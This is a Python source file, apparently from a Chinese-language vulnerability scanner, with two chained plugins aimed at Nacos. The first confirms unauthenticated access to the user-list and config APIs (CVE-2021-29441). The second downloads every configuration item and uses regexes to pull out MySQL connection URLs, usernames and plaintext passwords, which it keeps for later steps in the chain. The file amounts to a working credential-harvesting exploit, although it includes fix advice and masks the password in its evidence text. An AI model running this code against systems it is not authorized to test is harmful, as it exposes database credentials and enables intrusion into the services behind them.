# 链 3 专用插件：Nacos 未授权 → 配置泄露 → 数据库凭证
#
# 两个原子步骤：
#   1. NacosUnauthPlugin: Nacos 未授权访问验证（extra: nacos_url, accessible）
#   2. NacosConfigExtractPlugin: 拉取配置并提取数据库凭证（extra: db_url, db_username, db_password）
#
# 参考：Nacos 未授权访问漏洞（CVE-2021-29441）默认无需认证即可访问 /nacos/v1/auth/users?pageNo=1&pageSize=1
import re

from core.http import join_url
from core.logger import get_logger
from core.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from plugins.base import PluginBase

logger = get_logger(__name__)


class NacosUnauthPlugin(PluginBase):
    """Nacos 未授权访问验证（链 3 步骤 1）

    检查目标是否暴露 Nacos 服务且存在未授权访问漏洞。
    成功时 extra.nacos_url 存储可访问的 Nacos 地址。
    """

    name = "Nacos未授权访问"
    severity = "high"
    category = "vuln"
    description = "检测 Nacos 服务未授权访问（默认无认证）"
    fix = "Nacos 开启认证，修改默认密钥，限制访问 IP 白名单"

    # Nacos 常见路径前缀
    _NACOS_PATHS = ["/nacos", ""]  # 同端口部署或独立端口

    def verify(self, target, session):
        for prefix in self._NACOS_PATHS:
            # 检查用户列表接口（未授权访问特征）
            url = join_url(target, f"{prefix}/v1/auth/users?pageNo=1&pageSize=1")
            try:
                resp = session.get(url)
                text = resp.text
            except Exception:
                continue

            # 未授权特征：返回 JSON 含 username 字段（无 403）
            if "username" in text and resp.status_code == 200:
                # 进一步验证配置接口可访问
                config_url = join_url(target, f"{prefix}/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=10")
                try:
                    config_resp = session.get(config_url)
                    if "pageItems" in config_resp.text or "totalCount" in config_resp.text:
                        return ScanResult(
                            kind="chain",
                            name=self.name,
                            severity=self.severity,
                            status=STATUS_CONFIRMED,
                            url=url,
                            evidence="Nacos 未授权访问，用户列表和配置接口可读",
                            fix=self.fix,
                            extra={
                                "nacos_url": join_url(target, prefix),
                                "accessible": True,
                                "vuln_type": "nacos_unauth",
                            },
                        )
                except Exception:
                    logger.debug("Nacos 配置解析失败", exc_info=True)

            # 检查 Nacos 首页可达（但可能需认证）
            home_url = join_url(target, f"{prefix}/")
            try:
                home_resp = session.get(home_url)
                if "nacos" in home_resp.text.lower():
                    # Nacos 可达但用户接口不可读（可能已开启认证）
                    return ScanResult(
                        kind="chain",
                        name=self.name,
                        status=STATUS_SAFE,
                        url=home_url,
                        evidence="Nacos 可达但已开启认证",
                    )
            except Exception:
                continue

        return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=target, evidence="未检测到 Nacos 服务")


class NacosConfigExtractPlugin(PluginBase):
    """Nacos 配置提取（链 3 步骤 2）

    从 Nacos 拉取应用配置，正则提取数据库连接信息。
    成功时 extra.db_url / db_username / db_password 存储凭证。
    """

    name = "Nacos配置提取"
    severity = "high"
    category = "vuln"
    description = "从 Nacos 拉取配置并提取数据库凭证"
    fix = "Nacos 配置中的敏感信息加密存储，开启认证和访问控制"

    def verify(self, target, session):
        # 拉取配置列表
        list_url = join_url(target, "/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100")
        try:
            resp = session.get(list_url)
            text = resp.text
        except Exception as e:
            return ScanResult(
                kind="chain", name=self.name, status=STATUS_UNKNOWN, url=list_url, evidence=f"网络异常: {e}"
            )

        # 解析配置列表，寻找含数据库配置的项
        import json

        try:
            data = json.loads(text)
            configs = data.get("pageItems", []) or []
        except Exception:
            configs = []

        db_url = ""
        db_username = ""
        db_password = ""

        for cfg in configs:
            data_id = cfg.get("dataId", "")
            group = cfg.get("group", "")
            # 拉取具体配置内容
            content_url = join_url(target, f"/nacos/v1/cs/configs?dataId={data_id}&group={group}")
            try:
                content_resp = session.get(content_url)
                content = content_resp.text or ""
            except Exception:
                continue

            # 正则提取数据库连接信息
            url_match = re.search(r"url:\s*jdbc:mysql://([^\s]+)", content)
            if url_match:
                db_url = url_match.group(1)
            user_match = re.search(r"username:\s*(\S+)", content)
            if user_match:
                db_username = user_match.group(1)
            pwd_match = re.search(r"password:\s*(\S+)", content)
            if pwd_match:
                db_password = pwd_match.group(1)

            if db_url and db_username:
                break

        if db_url or db_username:
            evidence_parts = []
            if db_url:
                evidence_parts.append(f"数据库地址: {db_url}")
            if db_username:
                evidence_parts.append(f"用户名: {db_username}")
            if db_password:
                evidence_parts.append("密码: 已提取（脱敏）")
            return ScanResult(
                kind="chain",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=list_url,
                evidence="; ".join(evidence_parts),
                fix=self.fix,
                extra={
                    "db_url": db_url,
                    "db_username": db_username,
                    "db_password": db_password,
                    "vuln_type": "nacos_config_leak",
                },
            )

        return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=list_url, evidence="未提取到数据库配置")
